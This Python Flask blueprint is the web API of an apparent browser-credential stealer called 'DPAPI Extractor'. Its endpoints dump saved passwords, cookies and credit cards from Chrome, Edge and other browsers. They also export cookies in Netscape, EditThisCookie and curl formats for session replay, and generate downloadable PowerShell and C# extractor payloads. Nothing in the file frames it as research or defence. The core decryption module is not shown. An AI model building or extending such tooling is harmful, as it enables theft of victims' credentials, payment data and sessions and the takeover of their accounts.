"""
DPAPI Extractor Flask Routes
============================
Chrome/Edge şifre çözme ve cookie export API endpoint'leri.
"""

from flask import Blueprint, render_template, request, jsonify, Response
import json
import sys
import os

# Add tools to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

bp = Blueprint('dpapi_extractor', __name__, url_prefix='/dpapi-extractor')


@bp.route('/')
def index():
    """DPAPI Extractor dashboard"""
    return render_template('dpapi_extractor.html')


@bp.route('/api/browsers', methods=['GET'])
def get_browsers():
    """Get list of supported browsers"""
    try:
        from dpapi_extractor import BrowserType
        
        browsers = [{"name": b.value, "key": b.name} for b in BrowserType]
        return jsonify({"status": "success", "browsers": browsers})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@bp.route('/api/extract/passwords', methods=['POST'])
def extract_passwords():
    """Extract passwords from browsers"""
    try:
        from dpapi_extractor import get_extractor, BrowserType
        
        data = request.get_json() or {}
        browser_name = data.get('browser', 'CHROME')
        
        extractor = get_extractor()
        
        # Get browser enum
        try:
            browser = BrowserType[browser_name.upper()]
        except KeyError:
            return jsonify({
                "status": "error",
                "message": f"Unknown browser: {browser_name}"
            }), 400
        
        credentials = extractor.extract_passwords(browser)
        
        return jsonify({
            "status": "success",
            "browser": browser.value,
            "count": len(credentials),
            "credentials": [c.to_dict() for c in credentials]
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@bp.route('/api/extract/cookies', methods=['POST'])
def extract_cookies():
    """Extract cookies from browsers"""
    try:
        from dpapi_extractor import get_extractor, BrowserType
        
        data = request.get_json() or {}
        browser_name = data.get('browser', 'CHROME')
        domains = data.get('domains', [])
        
        extractor = get_extractor()
        
        try:
            browser = BrowserType[browser_name.upper()]
        except KeyError:
            return jsonify({
                "status": "error",
                "message": f"Unknown browser: {browser_name}"
            }), 400
        
        cookies = extractor.extract_cookies(browser, domains if domains else None)
        
        return jsonify({
            "status": "success",
            "browser": browser.value,
            "count": len(cookies),
            "cookies": [c.to_dict() for c in cookies]
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@bp.route('/api/extract/credit-cards', methods=['POST'])
def extract_credit_cards():
    """Extract credit card information"""
    try:
        from dpapi_extractor import get_extractor, BrowserType
        
        data = request.get_json() or {}
        browser_name = data.get('browser', 'CHROME')
        
        extractor = get_extractor()
        
        try:
            browser = BrowserType[browser_name.upper()]
        except KeyError:
            return jsonify({
                "status": "error",
                "message": f"Unknown browser: {browser_name}"
            }), 400
        
        cards = extractor.extract_credit_cards(browser)
        
        return jsonify({
            "status": "success",
            "browser": browser.value,
            "count": len(cards),
            "credit_cards": cards
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@bp.route('/api/extract/all', methods=['POST'])
def extract_all():
    """Extract all credentials from all browsers"""
    try:
        from dpapi_extractor import get_extractor
        
        extractor = get_extractor()
        results = extractor.extract_all_browsers()
        
        return jsonify({
            "status": "success",
            "results": results,
            "statistics": extractor.get_statistics()
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@bp.route('/api/export/cookies/netscape', methods=['POST'])
def export_cookies_netscape():
    """Export cookies in Netscape format"""
    try:
        from dpapi_extractor import get_extractor
        
        extractor = get_extractor()
        netscape_data = extractor.export_cookies_netscape()
        
        return Response(
            netscape_data,
            mimetype='text/plain',
            headers={'Content-Disposition': 'attachment; filename=cookies.txt'}
        )
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@bp.route('/api/export/cookies/json', methods=['POST'])
def export_cookies_json():
    """Export cookies in JSON format (EditThisCookie)"""
    try:
        from dpapi_extractor import get_extractor
        
        extractor = get_extractor()
        json_data = extractor.export_cookies_json()
        
        return Response(
            json_data,
            mimetype='application/json',
            headers={'Content-Disposition': 'attachment; filename=cookies.json'}
        )
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@bp.route('/api/export/cookies/curl', methods=['POST'])
def export_cookies_curl():
    """Export cookies as curl command"""
    try:
        from dpapi_extractor import get_extractor
        
        data = request.get_json() or {}
        domain = data.get('domain')
        
        extractor = get_extractor()
        curl_cmd = extractor.export_cookies_curl(domain=domain)
        
        return jsonify({
            "status": "success",
            "curl_command": curl_cmd
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@bp.route('/api/generate/powershell', methods=['GET'])
def generate_powershell():
    """Generate PowerShell extractor script"""
    try:
        from dpapi_extractor import get_extractor
        
        extractor = get_extractor()
        ps_script = extractor.generate_powershell_extractor()
        
        return Response(
            ps_script,
            mimetype='text/plain',
            headers={'Content-Disposition': 'attachment; filename=dpapi_extractor.ps1'}
        )
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@bp.route('/api/generate/csharp', methods=['GET'])
def generate_csharp():
    """Generate C# extractor code"""
    try:
        from dpapi_extractor import get_extractor
        
        extractor = get_extractor()
        cs_code = extractor.generate_csharp_extractor()
        
        return Response(
            cs_code,
            mimetype='text/plain',
            headers={'Content-Disposition': 'attachment; filename=DPAPIExtractor.cs'}
        )
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@bp.route('/api/statistics', methods=['GET'])
def get_statistics():
    """Get extraction statistics"""
    try:
        from dpapi_extractor import get_extractor
        
        extractor = get_extractor()
        stats = extractor.get_statistics()
        
        return jsonify({
            "status": "success",
            "statistics": stats
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
